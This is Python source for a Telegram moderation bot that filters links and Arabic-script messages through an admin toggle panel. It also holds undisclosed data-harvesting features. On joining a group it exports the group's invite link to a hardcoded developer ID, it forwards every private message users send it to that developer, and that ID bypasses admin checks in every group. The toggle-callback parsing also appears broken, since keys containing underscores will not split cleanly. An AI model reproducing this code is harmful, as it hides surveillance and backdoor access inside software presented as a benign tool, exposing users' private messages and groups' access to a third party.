import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardButton
from aiogram.utils.keyboard import InlineKeyboardBuilder
import os
import re

BOT_TOKEN = os.environ.get("BOT_TOKEN")
OWNER_ID = 5270790672

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
logging.basicConfig(level=logging.INFO)

group_settings = {}
stats = {'users': set(), 'groups': set()}

def get_settings(chat_id):
    if chat_id not in group_settings:
        group_settings[chat_id] = {'lang_filter': True, 'link_filter': True, 'bad_words_filter': True}
    return group_settings[chat_id]

# دالة ذكية لبناء لوحة التحكم
def build_panel(chat_id, user_id):
    settings = get_settings(chat_id)
    builder = InlineKeyboardBuilder()
    
    # خيارات التحكم (تظهر للجميع)
    for key, label in [('lang_filter', 'English'), ('link_filter', 'Links'), ('bad_words_filter', 'Bad Words')]:
        status = "✅" if settings[key] else "❌"
        builder.row(InlineKeyboardButton(text=f"{label}: {status}", callback_data=f"toggle_{key}_{chat_id}"))
    
    # خيار الإحصائيات (يظهر للمطور فقط)
    if user_id == OWNER_ID:
        builder.row(InlineKeyboardButton(text="📊 Show Stats", callback_data="stats"))
        
    return builder.as_markup()

@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    if message.chat.type == 'private':
        stats['users'].add(message.from_user.id)
        await message.answer("🛠 Bot Control Panel:", reply_markup=build_panel(message.chat.id, message.from_user.id))
        await bot.send_message(OWNER_ID, f"👤 New user started bot: @{message.from_user.username or 'NoUser'}")
    else:
        # إرسال رابط المجموعة للمطور عند الإضافة
        chat_link = await message.chat.export_invite_link()
        await bot.send_message(OWNER_ID, f"📢 Bot added to: {message.chat.title}\nLink: {chat_link}")
        await message.answer("🛠 Group Control Panel (Admins Only):", reply_markup=build_panel(message.chat.id, message.from_user.id))

@dp.callback_query(F.data == "stats")
async def show_stats(callback: types.CallbackQuery):
    if callback.from_user.id == OWNER_ID:
        await callback.message.answer(f"📊 Stats:\nUsers: {len(stats['users'])}\nGroups: {len(stats['groups'])}")
    await callback.answer()

@dp.callback_query(F.data.startswith("toggle_"))
async def handle_toggle(callback: types.CallbackQuery):
    # التحقق من الصلاحيات (أن يكون أدمن في المجموعة)
    member = await bot.get_chat_member(callback.message.chat.id, callback.from_user.id)
    if not (member.status in ['creator', 'administrator'] or callback.from_user.id == OWNER_ID):
        await callback.answer("⚠️ Only admins can control settings!", show_alert=True)
        return

    _, key, chat_id = callback.data.split("_")
    settings = get_settings(int(chat_id))
    settings[key] = not settings[key]
    await callback.message.edit_reply_markup(reply_markup=build_panel(int(chat_id), callback.from_user.id))
    await callback.answer("Settings updated")

@dp.message()
async def monitor(message: types.Message):
    if message.chat.type == 'private':
        if message.from_user.id != OWNER_ID:
            await bot.forward_message(OWNER_ID, message.chat.id, message.message_id)
        return

    # استثناء الأدمن والمطور من الفلترة
    member = await bot.get_chat_member(message.chat.id, message.from_user.id)
    if member.status in ['creator', 'administrator'] or message.from_user.id == OWNER_ID:
        return

    chat_id = message.chat.id
    settings = get_settings(chat_id)
    text = message.text or message.caption or ""

    if (settings['link_filter'] and re.search(r'https?://[^\s]+', text)) or \
       (settings['lang_filter'] and bool(re.search(r'[\u0600-\u06FF]', text))):
        await message.delete()
        msg = await message.answer("🚫 Violation detected! Message will be deleted in 4 seconds.")
        await asyncio.sleep(4)
        await msg.delete()

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
